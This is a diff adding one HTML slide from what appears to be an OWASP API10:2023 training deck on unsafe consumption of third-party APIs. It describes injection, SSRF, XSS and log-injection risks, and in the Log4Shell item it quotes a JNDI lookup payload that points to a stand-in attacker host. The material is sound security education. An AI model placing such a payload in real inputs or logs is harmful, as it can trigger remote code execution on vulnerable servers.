@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API10:2023 &#x2014; Unsafe Consumption of APIs &#xb7; Slide 5 of 28</title>
+<link rel="stylesheet" href="api10-shared.css">
+</head>
+<body>
+<div class="top-nav">
+  <div class="nav-left"><span class="nav-badge">API10:2023</span><span class="nav-title">Unsafe Consumption of APIs</span></div>
+  <span class="nav-right">Slide 5 of 28</span>
+</div>
+<div class="progress-wrap">
+  <div class="tab-nav"><a class="seg done" href="api10-slide-01.html"></a><a class="seg done" href="api10-slide-02.html"></a><a class="seg done" href="api10-slide-03.html"></a><a class="seg done" href="api10-slide-04.html"></a><a class="seg active" href="api10-slide-05.html"></a><a class="seg" href="api10-slide-06.html"></a><a class="seg" href="api10-slide-07.html"></a><a class="seg" href="api10-slide-08.html"></a><a class="seg" href="api10-slide-09.html"></a><a class="seg" href="api10-slide-10.html"></a><a class="seg" href="api10-slide-11.html"></a><a class="seg" href="api10-slide-12.html"></a><a class="seg" href="api10-slide-13.html"></a><a class="seg" href="api10-slide-14.html"></a><a class="seg" href="api10-slide-15.html"></a><a class="seg" href="api10-slide-16.html"></a><a class="seg" href="api10-slide-17.html"></a><a class="seg" href="api10-slide-18.html"></a><a class="seg" href="api10-slide-19.html"></a><a class="seg" href="api10-slide-20.html"></a><a class="seg" href="api10-slide-21.html"></a><a class="seg" href="api10-slide-22.html"></a><a class="seg" href="api10-slide-23.html"></a><a class="seg" href="api10-slide-24.html"></a><a class="seg" href="api10-slide-25.html"></a><a class="seg" href="api10-slide-26.html"></a><a class="seg" href="api10-slide-27.html"></a><a class="seg" href="api10-slide-28.html"></a></div>
+  <div class="progress-labels"><span>Part 1 &#xb7; What Is It?</span><span>Slide 5</span></div>
+</div>
+<div class="slide active">
+
+  <div class="slide-eyebrow">Slide 5 &#xb7; Threat Manifestations</div>
+  <div class="slide-title">Four ways that trust in third-party responses becomes a vulnerability.</div>
+  <div class="slide-subtitle">Injection, redirects, data exposure, and script compromise &#x2014; each exploits a different aspect of implicit trust.</div>
+  <div class="outcome-list">
+    <div class="outcome-item">
+      <div class="outcome-icon">&#x1F489;</div>
+      <div><div class="outcome-title">Injection via third-party data fields</div><div class="outcome-desc">Third-party response fields (addresses, names, descriptions) are inserted into SQL queries, HTML templates, or log statements without sanitization. A compromised or tampered third-party response contains an injection payload. Because the data comes from a &#x201C;trusted&#x201D; source, the parameterization or escaping that protects against user-input injection was never applied.</div></div>
+    </div>
+    <div class="outcome-item">
+      <div class="outcome-icon">&#x27A1;&#xFE0F;</div>
+      <div><div class="outcome-title">SSRF via third-party redirect</div><div class="outcome-desc">The consuming API follows redirects returned by a third-party service. An attacker compromises the third-party to return a redirect to an internal URL (cloud metadata endpoint, internal admin API, internal database). The consuming API follows the redirect server-side &#x2014; reaching an internal target it would normally be protected from &#x2014; because the redirect came from a &#x201C;trusted&#x201D; integration.</div></div>
+    </div>
+    <div class="outcome-item">
+      <div class="outcome-icon">&#x1F5A5;&#xFE0F;</div>
+      <div><div class="outcome-title">XSS via unsanitized third-party content</div><div class="outcome-desc">Profile data, product descriptions, or enrichment results from a third-party API are stored and later rendered in HTML without escaping. The compromised third-party injects a script tag into a data field. When other users&#x2019; browsers render the page, the script executes in their session &#x2014; stealing cookies, tokens, or performing actions on their behalf.</div></div>
+    </div>
+    <div class="outcome-item">
+      <div class="outcome-icon">&#x1F4DC;</div>
+      <div><div class="outcome-title">Log injection / Log4Shell pattern</div><div class="outcome-desc">Third-party API responses are logged directly. A malicious string in a third-party response field &#x2014; such as a <code>${jndi:ldap://attacker.com/a}</code> JNDI lookup &#x2014; is passed to the logging framework. If the logging framework evaluates the string (as Log4j 2 did before the Log4Shell patch), it initiates a server-side DNS lookup or class load &#x2014; enabling RCE. The payload arrived through a trusted channel; the logging layer had no reason to sanitize it.</div></div>
+    </div>
+  </div>
+  <div class="btn-row">
+    <a class="btn-secondary" href="api10-slide-04.html">&#x2190; Back</a>
+    <a class="btn-primary" href="api10-slide-06.html">Why does this happen? &#x2192;</a>
+  </div>
+
+</div>
+<div class="page-footer"><a href="sources.html">&#x1F4C4; View sources</a></div>
+</body>
+</html>
